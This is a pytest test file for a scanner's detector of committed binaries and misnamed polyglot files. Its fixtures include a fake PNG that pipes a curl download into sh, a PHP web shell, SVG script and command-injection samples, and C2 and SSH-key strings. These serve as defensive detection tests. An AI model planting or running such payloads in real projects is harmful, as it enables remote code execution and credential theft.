"""Committed binaries, and files whose bytes contradict their name.

Every other detector reads source. These tests are about the files that have
none, where the questions worth asking are what format this is, whether it
belongs where it sits, and whether the name agrees with the content.

The severity split carries most of the design: a vendored library is a note and
a binary in a scripts directory is a finding, and the difference is context
rather than format.
"""

from __future__ import annotations

import pytest

from cordon_scanner.detect.base import FileUnit, ScanContext
from cordon_scanner.detect.binary.detector import BinaryDetector
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.content import FileContent
from cordon_scanner.foundation.models import Category, Severity
from cordon_scanner.rules.loader import RuleLoader, RuleSet

ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32


class BinaryHelpers:
    """Helpers for test_binary.py."""

    @staticmethod
    def findings_for(
        path: str, raw: bytes, *, hooks: tuple[str, ...] = (), tree: tuple[str, ...] = ()
    ) -> list:
        ctx = ScanContext(
            config=Config.default(),
            rules=RuleSet(RuleLoader.load_builtin()),
            install_hook_paths=frozenset(hooks),
            tree_paths=frozenset((path, *tree)),
        )
        unit = FileUnit(content=FileContent.from_bytes(path, raw), language=None)
        return list(BinaryDetector().inspect(unit, ctx))

    @staticmethod
    def ids_for(path: str, raw: bytes, **kwargs) -> list[str]:
        return [f.rule_id for f in BinaryHelpers.findings_for(path, raw, **kwargs)]


class TestIdentification:
    def test_an_elf_is_recognised(self) -> None:
        found = BinaryDetector.identify(ELF)
        assert found is not None
        assert found.executable

    def test_a_png_is_not_an_executable(self) -> None:
        found = BinaryDetector.identify(PNG)
        assert found is not None
        assert not found.executable

    def test_text_is_not_a_format(self) -> None:
        assert BinaryDetector.identify(b"const x = 1;\n") is None


class TestContext:
    """The format is the same; where it sits is what changes."""

    def test_a_binary_in_a_scripts_directory_is_a_finding(self) -> None:
        found = BinaryHelpers.findings_for("scripts/helper", ELF)
        assert [f.rule_id for f in found] == ["SUSPECT.BINARY.EXECUTABLE_PATH.001"]
        assert found[0].severity is Severity.HIGH

    def test_a_binary_named_by_an_install_hook_is_a_finding(self) -> None:
        found = BinaryHelpers.findings_for("tool", ELF, hooks=("tool",))
        assert found[0].rule_id == "SUSPECT.BINARY.EXECUTABLE_PATH.001"

    def test_a_virtualenvs_own_launcher_is_a_note(self) -> None:
        # An sdist that packaged its build environment: `.venv/Scripts/pip.exe` beside the
        # environment's `pyvenv.cfg`. No lifecycle step runs it (review 98 G6).
        found = BinaryHelpers.findings_for(
            "pkg-1.0/.venv/Scripts/pip.exe", ELF, tree=("pkg-1.0/.venv/pyvenv.cfg",)
        )
        assert found[0].rule_id == "POLICY.BINARY.COMMITTED.001"

    def test_a_wheels_installed_command_is_a_note(self) -> None:
        # `<name>-<version>.data/scripts/` is what a wheel installs as the package's commands; no
        # install step runs it (`buf-bin`, `litestream-bin`).
        found = BinaryHelpers.findings_for("buf_bin-1.73.0.data/scripts/buf", ELF)
        assert found[0].rule_id == "POLICY.BINARY.COMMITTED.001"

    def test_a_scripts_directory_beside_a_data_directory_is_still_a_finding(self) -> None:
        found = BinaryHelpers.findings_for("pkg-1.0/data/scripts/helper", ELF)
        assert found[0].rule_id == "SUSPECT.BINARY.EXECUTABLE_PATH.001"

    def test_a_java_class_in_a_package_named_hooks_is_a_note(self) -> None:
        found = BinaryHelpers.findings_for(
            "tool.jar!ksp/hooks/Processor.class", bytes.fromhex("cafebabe0000003d") + bytes(64)
        )
        assert all(f.rule_id != "SUSPECT.BINARY.EXECUTABLE_PATH.001" for f in found)

    def test_a_scripts_directory_without_an_environment_is_still_a_finding(self) -> None:
        found = BinaryHelpers.findings_for(
            "pkg-1.0/.venv/Scripts/pip.exe", ELF, tree=("pkg-1.0/pyvenv.cfg",)
        )
        assert found[0].rule_id == "SUSPECT.BINARY.EXECUTABLE_PATH.001"

    def test_a_launcher_an_install_hook_names_is_still_a_finding(self) -> None:
        path = "pkg-1.0/.venv/Scripts/pip.exe"
        found = BinaryHelpers.findings_for(
            path, ELF, hooks=(path,), tree=("pkg-1.0/.venv/pyvenv.cfg",)
        )
        assert found[0].rule_id == "SUSPECT.BINARY.EXECUTABLE_PATH.001"

    def test_a_vendored_library_is_a_note(self) -> None:
        """Vendored native libraries and prebuilt fixtures are ordinary in a
        great many repositories. Calling each of them suspicious is how a
        reader learns to skip this detector's output."""
        found = BinaryHelpers.findings_for("vendor/libexample.so", ELF)
        assert found[0].rule_id == "POLICY.BINARY.COMMITTED.001"
        assert found[0].severity is Severity.LOW
        assert found[0].category is Category.POLICY

    def test_a_shell_script_is_source_and_not_reported(self) -> None:
        """Every content rule already reads it. Reporting it here would double
        every script in every repository."""
        assert BinaryHelpers.ids_for("scripts/build.sh", b"#!/bin/sh\necho hi\n") == []


class TestPolyglot:
    def test_a_png_that_is_a_script(self) -> None:
        found = BinaryHelpers.findings_for("logo.png", b"#!/bin/sh\ncurl https://x.invalid | sh\n")
        assert "SUSPECT.POLYGLOT.MISMATCH.001" in [f.rule_id for f in found]

    def test_a_png_that_is_a_zip(self) -> None:
        assert "SUSPECT.POLYGLOT.MISMATCH.001" in BinaryHelpers.ids_for(
            "logo.png", b"PK\x03\x04rest"
        )

    def test_a_real_png_is_not_a_polyglot(self) -> None:
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in BinaryHelpers.ids_for("logo.png", PNG)

    def test_a_png_whose_line_endings_were_rewritten_is_damaged_not_disguised(self) -> None:
        # git's text conversion on a PNG committed without `-text`: `\r\n` became `\n`.
        damaged = PNG.replace(b"\r\n", b"\n", 1)
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in BinaryHelpers.ids_for("logo.png", damaged)

    def test_a_script_after_a_damaged_signature_prefix_is_still_one(self) -> None:
        # Only the signature is forgiven; the shebang test above still reports a script.
        assert "SUSPECT.POLYGLOT.MISMATCH.001" in BinaryHelpers.ids_for(
            "logo.png", b"\x89PNG\r\n#!/bin/sh\n"
        )

    @pytest.mark.parametrize(
        ("name", "head"),
        [("main.exe", b"\x7fELF\x02\x01\x01"), ("tool-darwin-x64.exe", b"\xcf\xfa\xed\xfe")],
    )
    def test_one_platforms_binary_under_anothers_extension_is_a_convention(
        self, name: str, head: bytes
    ) -> None:
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in BinaryHelpers.ids_for(
            name, head + b"\x00" * 64
        )

    def test_a_script_named_like_a_library_is_still_reported(self) -> None:
        assert "SUSPECT.POLYGLOT.MISMATCH.001" in BinaryHelpers.ids_for(
            "libfoo.so", b"#!/bin/sh\necho\n"
        )

    @pytest.mark.parametrize("name", ["bin/cli.exe", "lib/native/tool.dll", "libfoo.so"])
    def test_a_launcher_script_under_a_program_name_is_recorded(self, name: str) -> None:
        """Every shell rule reads the script by its shebang, so the name hides nothing from the
        scan; it still misleads a person, so it stays on the record."""
        found = [
            f
            for f in BinaryHelpers.findings_for(name, b'#!/bin/sh\nexec node "$0.js" "$@"\n')
            if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"
        ]
        assert found and all(f.severity <= Severity.LOW for f in found)

    @pytest.mark.parametrize("name", ["assets/logo.png", "static/manual.pdf", "data/model.bin.gz"])
    def test_a_script_under_a_data_name_keeps_its_grade(self, name: str) -> None:
        found = [
            f
            for f in BinaryHelpers.findings_for(name, b'#!/bin/sh\nexec node "$0.js" "$@"\n')
            if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"
        ]
        assert found and all(f.severity >= Severity.HIGH for f in found)

    def test_a_source_extension_promises_nothing(self) -> None:
        """A `.py` file has no required first bytes, and most have no shebang.
        Treating the extension as a promise reported every Python file in the
        benign corpus as a forgery."""
        assert BinaryHelpers.ids_for("app.py", b"import os\n") == []
        assert BinaryHelpers.ids_for("app.py", b"#!/usr/bin/env python3\nimport os\n") == []

    def test_a_shared_extension_is_not_a_mismatch(self) -> None:
        """`.o` is both ELF and Mach-O; `.jar` is a ZIP."""
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in BinaryHelpers.ids_for("obj.o", ELF)
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in BinaryHelpers.ids_for(
            "lib.jar", b"PK\x03\x04x"
        )

    @pytest.mark.parametrize(
        "raw",
        [
            b"\x8f\x13\xa2\x00\x91\xfe" * 40,  # an encrypted secret named for what it decrypts to
            b"placeholder\n",  # a stand-in someone committed
            # An icon exported as SVG and saved under `.png`: shapes, nothing run or fetched.
            b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 2h20"/></svg>',
        ],
    )
    def test_no_format_and_no_code_under_an_image_name_is_recorded(self, raw: bytes) -> None:
        found = [
            f
            for f in BinaryHelpers.findings_for("assets/cover.png", raw)
            if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"
        ]
        assert found and all(f.severity <= Severity.LOW for f in found)

    @pytest.mark.parametrize(
        "raw",
        [
            b"push graphic-context\nviewbox 0 0 640 480\nfill url(https://x.test/a.jpg)\n",
            b"<?php system($_GET['c']); ?>",
            ELF + b"\x00" * 32,
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
            b'<svg><image xlink:href="|ls -la" width="1" height="1"/></svg>',
        ],
    )
    def test_code_or_a_program_under_an_image_name_is_not(self, raw: bytes) -> None:
        found = [
            f
            for f in BinaryHelpers.findings_for("assets/cover.png", raw)
            if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"
        ]
        assert found and all(f.severity >= Severity.HIGH for f in found)

    def test_an_extensionless_file_is_not_a_mismatch(self) -> None:
        assert "SUSPECT.POLYGLOT.MISMATCH.001" not in BinaryHelpers.ids_for(
            "Makefile", b"all:\n\tgcc x.c\n"
        )


class TestContent:
    def test_a_packer_signature_is_reported(self) -> None:
        raw = ELF + b"UPX0\x00UPX1\x00UPX!"
        assert "SUSPECT.BINARY.PACKED.001" in BinaryHelpers.ids_for("vendor/x.so", raw)

    @pytest.mark.parametrize(
        "raw",
        [
            # `MPRESS` is the middle of `COMPRESSED`: a Java class, a DEX file, debug symbols.
            b"\xca\xfe\xba\xbe\x00\x00\x004\x00COMPRESSED_FIXED_ID\x00",
            ELF + b"built with PyInstaller support\x00",
            ELF + b"UPX!",
        ],
    )
    def test_a_packer_named_in_passing_is_not_packing(self, raw: bytes) -> None:
        assert "SUSPECT.BINARY.PACKED.001" not in BinaryHelpers.ids_for("vendor/x.so", raw)

    @pytest.mark.parametrize("marker", [b".MPRESS1", b".themida", b"MEI\x0c\x0b\x0a\x0b\x0e"])
    def test_what_a_packer_writes_is_reported(self, marker: bytes) -> None:
        assert "SUSPECT.BINARY.PACKED.001" in BinaryHelpers.ids_for("vendor/x.so", ELF + marker)

    def test_interesting_strings_are_reported_by_kind(self) -> None:
        raw = ELF + b"https://c2.invalid/beacon\x00/bin/sh\x00.ssh/id_rsa\x00"
        found = [
            f
            for f in BinaryHelpers.findings_for("vendor/x.so", raw)
            if f.rule_id.endswith("STRINGS.001")
        ]
        assert found
        assert "a URL" in found[0].message

    def test_a_program_holding_a_url_and_a_shell_is_a_program(self) -> None:
        """Help text links a homepage and the program runs `/bin/sh`: every CLI does."""
        raw = ELF + b"https://example.com/docs\x00/bin/sh\x00"
        assert "SUSPECT.BINARY.STRINGS.001" not in BinaryHelpers.ids_for("bin/tool", raw)

    @pytest.mark.parametrize(
        ("name", "magic"),
        [
            ("fonts/codicon.ttf", b"\x00\x01\x00\x00"),
            ("fonts/icons.woff", b"wOFF"),
            ("fonts/icons.woff2", b"wOF2"),
            ("fonts/icons.otf", b"OTTO"),
        ],
    )
    def test_an_icon_font_is_data(self, name: str, magic: bytes) -> None:
        raw = (
            magic
            + b"\x00\x10"
            + b"\x00" * 64
            + b"terminal\x00/bin/bash\x00https://fonts.example\x00"
        )
        assert "SUSPECT.BINARY.STRINGS.001" not in BinaryHelpers.ids_for(name, raw)

    def test_font_magic_under_another_name_is_still_read(self) -> None:
        raw = b"wOFF\x00\x10" + b"\x00" * 64 + b"/bin/sh\x00https://c2.invalid/x\x00"
        assert "SUSPECT.BINARY.STRINGS.001" in BinaryHelpers.ids_for("helper", raw)

    def test_the_strings_themselves_are_never_emitted(self) -> None:
        """A URL in a committed binary can be a licence link or a
        command-and-control address, and this finding travels into CI logs and
        pull-request comments. The same discipline as the secret detector: say
        a URL is present, leave reading it to somebody holding the file."""
        raw = ELF + b"https://c2.invalid/beacon\x00"
        for finding in BinaryHelpers.findings_for("vendor/x.so", raw):
            assert "c2.invalid" not in finding.message
            assert "c2.invalid" not in (finding.evidence.snippet or "")

    def test_content_checks_do_not_depend_on_the_header(self) -> None:
        """`is_binary` is anchored at offset zero by design, so prepending a
        comment stops a payload being identified as an executable. It does not
        stop it containing what it contained, and the file must not go quiet."""
        raw = b"/* \x00 */\n" + ELF + b"https://c2.invalid/x\x00/bin/sh\x00UPX0UPX1UPX!"
        found = BinaryHelpers.ids_for("helper", raw)
        assert "SUSPECT.BINARY.STRINGS.001" in found
        assert "SUSPECT.BINARY.PACKED.001" in found

    def test_ordinary_text_is_not_examined_for_strings(self) -> None:
        assert BinaryHelpers.ids_for("notes.md", b"See https://example.com and run /bin/sh\n") == []
